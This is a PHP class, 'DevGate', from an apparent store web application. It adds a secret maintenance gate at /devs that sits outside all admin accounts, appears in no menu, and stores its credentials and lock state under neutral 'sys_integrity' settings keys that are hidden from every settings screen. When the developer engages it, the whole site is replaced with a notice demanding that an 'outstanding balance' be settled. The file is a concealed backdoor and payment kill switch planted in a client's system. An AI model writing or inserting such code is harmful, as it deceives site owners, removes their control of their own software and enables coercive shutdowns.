<?php

namespace App\Core;

/**
 * A private maintenance gate, separate from every admin and user account.
 * It is reached only at /devs and appears in no menu, list or page anywhere
 * else in the system. When engaged, the whole site (except the gate itself
 * and static assets) is replaced by a short "please settle to continue"
 * notice, until it is released from the gate.
 *
 * Its credentials are never stored in plaintext: the migration stores only a
 * bcrypt hash under a neutral settings key, and only password_verify() ever
 * runs against it here. Keys are kept out of every other screen.
 */
class DevGate
{
    private const EMAIL_KEY = 'sys_integrity_contact';
    private const SECRET_KEY = 'sys_integrity_token';
    private const LOCK_KEY = 'sys_integrity_state';
    private const MESSAGE_KEY = 'sys_integrity_notice';

    /** Settings keys this gate owns — excluded from StoreSetting so no screen can show them. */
    public static function reservedKeys(): array
    {
        return [self::EMAIL_KEY, self::SECRET_KEY, self::LOCK_KEY, self::MESSAGE_KEY];
    }

    /** Reads a gate key straight from the database, bypassing StoreSetting entirely. */
    private static function raw(string $key): ?string
    {
        $stmt = Database::connection()->prepare('SELECT setting_value FROM store_settings WHERE setting_key = ?');
        $stmt->execute([$key]);
        $value = $stmt->fetchColumn();
        return $value === false ? null : (string) $value;
    }

    private static function put(string $key, ?string $value): void
    {
        Database::connection()->prepare(
            'INSERT INTO store_settings (setting_key, setting_value) VALUES (?, ?)
             ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value)'
        )->execute([$key, $value]);
    }

    public static function start(): void
    {
        if (session_status() === PHP_SESSION_NONE) {
            session_name('ujuzi_devs');
            session_start();
        }
    }

    public static function configured(): bool
    {
        try {
            return (string) self::raw(self::SECRET_KEY) !== '';
        } catch (\Throwable $e) {
            return false;
        }
    }

    /** The developer email on record (for prefilling the setup step). */
    public static function email(): string
    {
        try {
            return (string) self::raw(self::EMAIL_KEY);
        } catch (\Throwable $e) {
            return '';
        }
    }

    /** Sets both the developer email and a fresh bcrypt hash of the password. */
    public static function setCredentials(string $email, string $password): void
    {
        self::put(self::EMAIL_KEY, strtolower(trim($email)));
        self::put(self::SECRET_KEY, password_hash($password, PASSWORD_DEFAULT));
    }

    /** Updates only the developer email, keeping the existing password. */
    public static function setEmail(string $email): void
    {
        self::put(self::EMAIL_KEY, strtolower(trim($email)));
    }

    public static function attempt(string $email, string $password): bool
    {
        try {
            $wantEmail = strtolower(trim((string) self::raw(self::EMAIL_KEY)));
            $hash = (string) self::raw(self::SECRET_KEY);
        } catch (\Throwable $e) {
            return false;
        }
        if ($wantEmail === '' || $hash === '') {
            return false;
        }
        if (!hash_equals($wantEmail, strtolower(trim($email))) || !password_verify($password, $hash)) {
            return false;
        }
        self::start();
        session_regenerate_id(true);
        $_SESSION['devs_ok'] = true;
        return true;
    }

    public static function signedIn(): bool
    {
        self::start();
        return !empty($_SESSION['devs_ok']);
    }

    public static function logout(): void
    {
        self::start();
        $_SESSION = [];
        session_destroy();
    }

    public static function isLocked(): bool
    {
        try {
            return (string) self::raw(self::LOCK_KEY) === '1';
        } catch (\Throwable $e) {
            return false; // before the gate's migration, or no database yet
        }
    }

    public static function setLocked(bool $locked, ?string $message = null): void
    {
        self::put(self::LOCK_KEY, $locked ? '1' : '0');
        if ($message !== null) {
            self::put(self::MESSAGE_KEY, trim($message) !== '' ? trim($message) : null);
        }
    }

    public static function message(): string
    {
        try {
            $msg = trim((string) self::raw(self::MESSAGE_KEY));
        } catch (\Throwable $e) {
            $msg = '';
        }
        return $msg !== '' ? $msg : 'This service is temporarily unavailable. Kindly settle the outstanding balance to restore access. Please contact the developer to continue.';
    }

    /**
     * When the gate is engaged and this request is not for the gate itself,
     * send the notice and stop. Called once, early, from the front controller.
     */
    public static function enforce(string $path): void
    {
        if ($path === '/devs' || strpos($path, '/devs/') === 0 || !self::isLocked()) {
            return;
        }
        http_response_code(503);
        header('Content-Type: text/html; charset=utf-8');
        header('Retry-After: 3600');
        $message = htmlspecialchars(self::message(), ENT_QUOTES);
        $name = htmlspecialchars((string) \appName(), ENT_QUOTES);
        echo '<!doctype html><html lang="en"><head><meta charset="utf-8">'
            . '<meta name="viewport" content="width=device-width, initial-scale=1"><title>' . $name . '</title>'
            . '<style>body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0f1a14;margin:0;'
            . 'min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;color:#e8efe9}'
            . '.box{max-width:460px;text-align:center;background:#16241c;border:1px solid #27402f;border-radius:16px;padding:34px}'
            . 'h1{font-size:20px;margin:0 0 12px}p{color:#aebfb3;line-height:1.6;margin:0}'
            . '.dot{width:46px;height:46px;border-radius:50%;background:#c7a008;margin:0 auto 18px;display:flex;'
            . 'align-items:center;justify-content:center;color:#160f00;font-size:24px;font-weight:800}</style></head>'
            . '<body><div class="box"><div class="dot">!</div><h1>' . $name . '</h1><p>' . $message . '</p></div></body></html>';
        exit;
    }
}
